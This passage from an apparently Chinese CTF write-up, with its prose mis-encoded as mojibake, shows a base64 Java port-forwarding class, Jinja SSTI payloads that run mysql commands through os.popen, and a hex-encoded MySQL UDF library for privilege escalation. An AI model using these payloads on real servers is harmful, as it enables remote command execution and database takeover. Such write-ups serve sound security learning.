MAJ8AJQwAPwBAAQANY29tL2N0Zi9Qcm94eQEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JbnB1dFN0cmVhbQEAFGphdmEvaW8vT3V0cHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEABChJKVYBAAZhY2NlcHQBABMoKUxqYXZhL25ldC9Tb2NrZXQ7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAFmdldFJlbW90ZVNvY2tldEFkZHJlc3MBABooKUxqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvT2JqZWN0OylWAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgoAoAChCgAgAKIBAANydW4BAEcoTGNvbS9jdGYvUHJveHk7TGphdmEvbmV0L1NvY2tldDtMamF2YS9uZXQvU29ja2V0OylMamF2YS9sYW5nL1J1bm5hYmxlOwEAFyhMamF2YS9sYW5nL1J1bm5hYmxlOylWAQAFc3RhcnQKACAAowEAD3ByaW50U3RhY2tUcmFjZQEABWNsb3NlAQANYWRkU3VwcHJlc3NlZAEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAA9nZXRPdXRwdXRTdHJlYW0BABgoKUxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAUoW0IpSQEABXdyaXRlAQAHKFtCSUkpVgEABWZsdXNoBwCkDAClAKkMAFYAQAwAVQBAAQAiamF2YS9sYW5nL2ludm9rZS9MYW1iZGFNZXRhZmFjdG9yeQEAC21ldGFmYWN0b3J5BwCrAQAGTG9va3VwAQAMSW5uZXJDbGFzc2VzAQDMKExqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZFR5cGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTtMamF2YS9sYW5nL2l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"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cls<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>base64é‡Œçš„ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">OutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ServerSocket</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Proxy</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> sourcePort <span class="token operator">=</span> <span class="token number">6666</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> destinationHost <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>        <span class="token keyword">short</span> destinationPort <span class="token operator">=</span> <span class="token number">3306</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ServerSocket</span> serverSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span>sourcePort<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                            <span class="token class-name">Socket</span> sourceSocket <span class="token operator">=</span> serverSocket<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sourceSocket<span class="token punctuation">.</span><span class="token function">getRemoteSocketAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token class-name">Socket</span> destinationSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>destinationHost<span class="token punctuation">,</span> destinationPort<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token class-name">Thread</span> sourceToDestination <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">forwardData</span><span class="token punctuation">(</span>sourceSocket<span class="token punctuation">,</span> destinationSocket<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            sourceToDestination<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token class-name">Thread</span> destinationToSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">forwardData</span><span class="token punctuation">(</span>destinationSocket<span class="token punctuation">,</span> sourceSocket<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            destinationToSource<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var10<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            var10<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var11<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    serverSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var9<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    var11<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var9<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">throw</span> var11<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var12<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var12<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">forwardData</span><span class="token punctuation">(</span><span class="token class-name">Socket</span> inputSocket<span class="token punctuation">,</span> <span class="token class-name">Socket</span> outputSocket<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> inputSocket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">OutputStream</span> outputStream <span class="token operator">=</span> outputSocket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> read<span class="token punctuation">;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>read <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>outputStream<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> read<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var10<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>outputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                            outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var9<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            var10<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var9<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">throw</span> var10<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>outputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var11<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>inputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                        inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        var11<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var8<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">throw</span> var11<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>inputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var12<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                inputSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                outputSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token class-name">OutputStream</span> o<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        o<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>        o<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="udfææƒ"><a href="#udfææƒ" class="headerlink" title="udfææƒ"></a>udfææƒ</h3><p>é‚£ä¹ˆæˆ‘ä»¬å…ˆå°è¯•è¿æ¥ä¸€ä¸‹æ•°æ®åº“</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"mysql -uctf -p'123456' -e 'show databases;'"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆåŠŸè¿æ¥</p><p>æ¥ä¸‹æ¥å°è¯•udfææƒ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'mysql -uctf -p\'123456\' -e \'show variables like "%plugin%";\''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706022300239.png" alt="image-20240706022300239"></p><p>è·¯å¾„åœ¨<code>/usr/lib/mysql/plugin/</code></p><p>å†™å…¥soæ–‡ä»¶</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">&#123;&#123;config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'mysql -uctf -p\'123456\' -e \'SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d2